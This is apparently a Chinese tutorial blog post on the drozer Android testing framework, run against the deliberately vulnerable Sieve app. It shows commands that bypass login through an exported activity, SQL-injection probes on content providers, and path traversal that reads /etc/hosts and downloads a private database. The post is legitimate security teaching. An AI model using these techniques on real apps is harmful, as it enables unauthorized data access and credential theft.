### 0x01 简述

drozer是MWR Labs开发的一款开源android安全测试框架，提供了命令行交互式界面。提示符为`dz>`

在安装之前需要提供以下环境：

- JDK 1.6 （因为Android字节码为1.6版本）
- Python 2.7
- Android SDK

并且需要确保以下命令在path路径下:

- adb
- java

具体安装方式详见[官网][https://labs.mwrinfosecurity.com/tools/drozer/]

### 0x02 准备

#### 连接Android设备

我这里用夜神模拟器

```c
rz:/tmp$ adb start-server
rz:/tmp$ adb connect 127.0.0.1:62001
already connected to 127.0.0.1:62001
rz:/tmp$ adb devices
List of devices attached
127.0.0.1:62001 device
```

#### 运行drozer Agent

如下：

![drozer agent](/images/Sat-Aug-11-02:03:22-2018_830786.png "drozer agent")

可以看到监听的端口为 31415，用adb进行端口转发至本地

```c
rz:/tmp$ adb forward tcp:31415 tcp:31415
```

#### PC连接

```c
rz:/$ drozer console connect
Could not find java. Please ensure that it is installed and on your PATH.

If this error persists, specify the path in the ~/.drozer_config file:

    [executables]
    java = /path/to/java
Selecting b05216adb9e73825 (Xiaomi  MI 6  4.4.2)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz>
```

### 0x03 开始

输入help可查看相关的命令：

```c
dz> help
...
cd     contributors  env   help  load    permissions  set    unset
clean  echo          exit  list  module  run          shell
```

输入`list`可查看当前session所有可执行的模块：

```c
dz> list
app.activity.forintent                   Find activities that can handle the given intent
app.activity.info                        Gets information about exported activities.
app.activity.start                       Start an Activity
app.broadcast.info                       Get information about broadcast receivers
...
tools.setup.busybox                      Install Busybox.
tools.setup.minimalsu                    Prepare 'minimal-su' binary installation on the device.
```

这些模块可以用`help`命令查看模块的帮助，用`run`命令执行，例如查看所有包名可以用`app.package.list`

```c
dz> help app.package.list
usage: run app.package.list [-h] [-d DEFINES_PERMISSION] [-f FILTER] [-g GID]
              [-p PERMISSION] [-u UID] [-n]
...

dz> run app.package.list
com.android.soundrecorder (录音机)
com.android.defcontainer (应用包访问权限帮助程序)
...

dz> run app.package.list -f sieve    // 查找我们要测试的目标apk包
com.mwr.example.sieve (Sieve)
```

#### 查看包的信息

`app.package.info`可以查看包的信息（可先查看帮助`dz> help app.package.info`查看模块使用说明）

```c
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  Application Label: Sieve
  Process Name: com.mwr.example.sieve
  Version: 1.0
  Data Directory: /data/data/com.mwr.example.sieve
  APK Path: /data/app/com.mwr.example.sieve-1.apk
  UID: 10032
  GID: [1028, 1015, 1023, 3003]
  Shared Libraries: null
  Shared User ID: null
  Uses Permissions:
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.INTERNET
  Defines Permissions:
  - com.mwr.example.sieve.READ_KEYS
  - com.mwr.example.sieve.WRITE_KEYS
```

#### 确认攻击面

`app.package.attacksurface`可以确认一下包有哪些是exported的

```c
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable    // 说明这个apk AndroidManifest.xml 中的 android:debuggable 为true
```

如上，可看出这个app可调试，暴露出来了3个Activity，2个Content，2个Services

### 0x04 利用

可以利用一些命令来确定这些攻击面是否有效

#### Activity
```c
dz> run app.activity.info -a com.mwr.example.sieve    // 查看暴露出来了哪些activity
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList
    Permission: null

// 运行PWList这个activity
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```
在运行后，可以看到，绕过了认证，直接来到了之后的页面

#### Content Provider

与Activity类似，使用info命令查看provider的信息：

```c
dz> run app.provider.info -a com.mwr.example.sieve  // 展示出之前“确认攻击面”时发现的两个 content provider
Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.DBContentProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
    Path Permissions:
      Path: /Keys
        Type: PATTERN_LITERAL
        Read Permission: com.mwr.example.sieve.READ_KEYS
        Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.FileBackupProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
```

用scanner命令获取所有可访问的uri：

```c
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/
Unable to Query  content://com.mwr.example.sieve.DBContentProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys

Accessible content URIs:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

请求uri，获取数据：

```c
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical  // 默认显示在一行里，添加--vertical可以改变为列显示
     _id          1
 service       1
username
password  pungdhh3ppym6eB2GHemnJ2RbuiiI46E8VoljGDPlIk= (Base64-encoded)
   email        1

```

检测sql注入问题：

```c
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"    // projection-> column，插入单引号，报错，SQL注入问题存在
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"     // selection-> 条件语句,插入单引号，报错，SQL注入问题存在
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

用scanner模块自动检测sql注入：

```c
dz> help scanner.provider.injection // 查看帮助
usage: run scanner.provider.injection [-h] [-a <package or uri>]

Search for content providers with SQL Injection vulnerabilities.

dz> run scanner.provider.injection -a content://com.mwr.example.sieve.DBContentProvider/Passwords // 扫描content
Not Vulnerable:
  No non-vulnerable URIs found.

Injection in Projection: // column 存在注入
  content://com.mwr.example.sieve.DBContentProvider/Passwords

Injection in Selection: // selection 存在注入
  content://com.mwr.example.sieve.DBContentProvider/Passwords

dz> run scanner.provider.injection -a com.mwr.example.sieve    // 直接扫描包名，看看是否存在注入
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.DBContentProvider
  content://com.mwr.example.sieve.FileBackupProvider

Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/

Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

目录遍历：

```c
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider

Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```

利用：

```c
// 读取hosts文件
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/../../etc/hosts
127.0.0.1                   localhost

// 下载私有目录下的数据库文件
dz> run app.provider.download  content://com.mwr.example.sieve.FileBackupProvider/../../data/data/com.mwr.example.sieve/databases/database.db /tmp/sieve.db
Written 24576 bytes

// 查看刚刚下载的文件
rz:/tmp$ ls -l | grep sieve
-rw-rw-rw- 1 rz rz      24576 Aug 11 10:29 sieve.db
```

#### Service

查看Service信息

```c
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```

利用CryptosService解密之前的到的password (pungdhh3ppym6eB2GHemnJ2RbuiiI46E8VoljGDPlIk=)

```python
// --extra支持的类型
    extra_types = [ 'boolean',
                    'byte',
                    'char',
                    'double',
                    'float',
                    'integer',
                    'long',
                    'parcelable',
                    'short',
                    'string',
                    'bytearray' ]
```



```c
// 运行服务
dz> run app.service.start --component com.mwr.example.sieve com.mwr.example.sieve.CryptoService

// 查看帮助
dz> help app.service.send
usage: run app.service.send [-h] [--msg what arg1 arg2] [--extra type key value]
              [--no-response] [--timeout TIMEOUT] [--bundle-as-obj]
              package component

// 发送数据
。。。
```

#### 其它模块

- shell.start

  相当于`adb shell`

- tools.file.upload / tools.file.download

  向设备上传、下载文件

- tools.setup.busybox / tools.setup.minimalsu

  安装busybox或minimalsu

### 0x05 模块

drozer提供了插件接口方便开发者自己写插件增强功能

。。。

---
### 0x06 参考

> [drozer](https://labs.mwrinfosecurity.com/tools/drozer/)
>
> [drozer-pdf](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf)
>
> [sieve.apk](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk)
>
> [官方插件](http://www.droidsec.cn/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%BC%80%E5%8F%91drozer%E6%8F%92%E4%BB%B6%E4%B9%8Bautoattack/)
>
> [第三方插件](https://github.com/mwrlabs/drozer-modules)
